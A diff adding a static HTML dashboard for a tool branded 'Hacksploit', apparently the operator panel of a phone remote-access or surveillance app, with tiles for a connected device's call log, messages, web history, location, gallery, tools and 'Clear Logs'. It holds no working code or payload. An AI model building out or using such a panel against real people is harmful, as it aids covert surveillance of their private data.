@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="nav1">
+            <span onclick="window.open('index.html', '_current')">Hacksploit </span> <span id="appVersion">v1.0.7</span>
+            <img src="assets/user-solid-lightgrey.svg" alt="">
+        </div>
+        <div class="nav2">
+            <div>
+                <span>Status:</span> 
+                <span>Connected</span>
+            </div>
+        </div>
+    </header>
+    <main>
+        <section class="tiles" id="callLog" onclick="window.open('pages/callLog.html', '_current');">
+            <h3 class="tile_title">CALL LOG</h3>
+            <article>
+                <img src="assets/phone-solid.svg" alt="">
+                <span>+17</span>
+            </article>
+        </section>
+        <section class="tiles" id="messages" onclick="window.open('pages/messages.html', '_current');">
+            <h3 class="tile_title">MESSAGES</h3>
+            <article>
+                <img src="assets/comments-solid.svg" alt="">
+                <span>+9</span>
+            </article>
+        </section>
+        <section class="tiles" id="history" onclick="window.open('pages/webHistory.html', '_current');">
+            <h3 class="tile_title">WEB HISTORY</h3>
+            <article>
+                <img src="assets/earth-americas-solid.svg" alt="">
+                <span>+34</span>
+            </article>
+        </section>
+        <section class="tiles" id="location" onclick="window.open('index.html', '_current');">
+            <h3 class="tile_title">LOCATION</h3>
+            <article>
+                <img src="assets/location-dot-solid.svg" alt="">
+                <span>+0</span>
+            </article>
+        </section>
+        <section class="tiles" id="gallery" onclick="window.open('index.html', '_current');">
+            <h3 class="tile_title">GALLERY</h3>
+            <article>
+                <img src="assets/image-solid.svg" alt="">
+                <span>+78</span>
+            </article>
+        </section>
+        <section class="tiles" id="tools" onclick="window.open('pages/tools.html', '_current');">
+            <h3 class="tile_title">TOOLS</h3>
+            <article>
+                <img src="assets/gears-solid.svg" alt="">
+                <span>6</span>
+            </article>
+        </section>
+        <section class="tiles" id="clearlogs" onclick="window.open('index.html', '_current');">
+            <h3 class="tile_title">Clear Logs</h3>
+            <article>
+                <img src="assets/folder-solid.svg" alt="">
+                <span>+0</span>
+            </article>
+        </section>
+    </main>
+</body>
+</html>
